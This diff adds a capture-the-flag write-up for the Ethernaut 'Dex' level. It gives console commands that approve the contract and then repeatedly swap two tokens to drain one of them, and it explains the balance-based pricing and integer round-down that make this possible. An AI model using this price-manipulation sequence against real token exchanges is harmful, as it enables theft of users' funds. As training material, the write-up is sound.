@@ -777,3 +777,46 @@ we created our own implementation of the `price()` method because the building r
 
 
 
+# 22. [Challenge 22: Dex](https://ethernaut.openzeppelin.com/level/0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F)
+
+Tasks:
+- You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
+
+**Solution:** \
+To Solve in console:
+```
+First approve contract to transact on our behalf
+contract.approve(instance, 100)
+```
+
+```
+await contract.swap(await contract.token1(), await contract.token2(), 10);
+await contract.swap(await contract.token2(), await contract.token1(), 20);
+await contract.swap(await contract.token1(), await contract.token2(), 24);
+await contract.swap(await contract.token2(), await contract.token1(), 30);
+await contract.swap(await contract.token1(), await contract.token2(), 41);
+await contract.swap(await contract.token2(), await contract.token1(), 45);
+```
+
+Since the price relies on the token amount of the contract, we could swap reversibly until either token1 or token2 has 0 amount. In addition, the mathematic precision issue exists due to the fact that Solidity is no floating-point currently, so, the number is round down e.g., 24.444 to 24. We can illustrate the swapping as follows:
+Initial balance.
+    Player’s balance:
+    10 token1
+    10 token2
+    Contract’s balance:
+    100 token1
+    100 token2
+    The received amount if swap 10 token1 to token2:
+    (10 * 100) / 100 = 10 token2
+Player’s balance (swap 10 token1 to token2) :
+    0 token1
+    20 token2
+    Contract’s balance:
+    110 token1
+    90 token2
+    Received amount if swap 20 token2 to token1:
+    (20 * 110) / 90 ~ 24.444 = 24 token1 (round down)
+
+In the last swapping, we’ll have 65 token2. We cannot swap `65 token2` to `158** token1` since `token1` is not enough as of the current price. The contract currently has `110 token1` and `45 token2`. `(65 * 110 )/45 = 158`
+If we need to drain all 110 token1, the amount of token2 to be swapped is: `(65 * 110) / 158 = 45`
+
